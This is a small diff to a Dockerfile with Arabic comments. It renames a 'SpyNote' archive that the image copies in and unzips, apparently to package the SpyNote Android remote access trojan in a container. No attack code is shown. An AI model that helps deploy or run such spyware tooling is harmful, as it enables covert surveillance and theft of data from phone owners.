@@ -21,7 +21,7 @@ RUN dpkg --add-architecture i386 && \
 WORKDIR /app
 
 # انسخ الملف المضغوط وفك ضغطه
-COPY SpyNote\ V6.zip /app/app.zip
+COPY SpyNote.zip /app/app.zip
 RUN unzip app.zip && rm app.zip
 
 # انسخ ملف start.sh
